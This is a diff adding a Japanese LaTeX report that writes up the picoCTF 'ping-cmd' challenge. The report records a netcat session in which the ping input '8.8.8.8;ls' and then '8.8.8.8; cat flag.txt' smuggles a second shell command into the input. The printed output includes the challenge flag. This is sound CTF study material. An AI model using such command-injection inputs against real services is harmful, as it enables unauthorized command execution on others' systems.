@@ -1,0 +1,103 @@
+\documentclass[a4paper,11pt,lualatex,ja=standard]{bxjsarticle}
+
+% 数式
+\usepackage{amsmath,amsfonts}
+\usepackage{bm}
+% 画像
+\usepackage{graphicx}
+% url
+\usepackage{hyperref}
+
+% ===== cover command =====
+\newcommand{\cover}[3]{
+  \thispagestyle{empty}
+  \vspace*{4cm}
+  \begin{center}
+    {\LARGE #1}\\[2cm]
+    {\Large #2}\\[3cm]
+    {\large 氏名：#3}\\[1cm]
+    % {\large 学籍番号：s2510063}
+  \end{center}
+  \newpage
+}
+% =========================
+
+\begin{document}
+
+% ===== cover =====
+\cover{ping-cmd}{CyLab}{yukimi}
+% =================
+
+\title{レポートタイトル}
+\author{氏名}
+\date{\today}
+\section{問題文}
+\begin{verbatim}
+Can you make the server reveal its secrets? 
+It seems to be able to ping Google DNS, 
+but what happens if you get a little creative with your input?
+You can connect to the service here nc mysterious-sea.picoctf.net 64561
+\end{verbatim}
+\section{回答}
+\begin{verbatim}
+yukimi-academy@webshell:~$ nc mysterious-sea.picoctf.net 55367
+Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 
+  8.8.8.8
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=8.57 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=8.56 ms
+
+--- 8.8.8.8 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1001ms
+rtt min/avg/max/mdev = 8.564/8.564/8.565/0.000 ms
+ls
+yukimi-academy@webshell:~$ nc mysterious-sea.picoctf.net 55367
+Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'):
+   8.8.8.8;ls
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=8.77 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.50 ms
+
+--- 8.8.8.8 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 8.774/9.139/9.504/0.365 ms
+flag.txt
+script.sh
+        
+yukimi-academy@webshell:~$ nc mysterious-sea.picoctf.net 55367
+Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 
+  8.8.8.8; cat flag.txt
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=8.58 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.49 ms
+
+--- 8.8.8.8 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 8.582/9.036/9.491/0.454 ms
+picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_a9326567}
+
+
+\end{verbatim}
+\section{メモ}
+\begin{verbatim}
+reveal は動詞で、
+・明らかにする
+・暴露する
+・公開する
+・秘密を打ち明ける
+
+nc
+Netcat。サーバーと直接通信するためのコマンド。
+
+mysterious-sea.picoctf.net
+接続先サーバー名。
+
+64561
+接続先ポート番号。
+
+つまり日本語では、
+picoCTF が用意したリモートサーバーの 64561 番窓口に接続する
+\end{verbatim}
+
+
+\end{document}
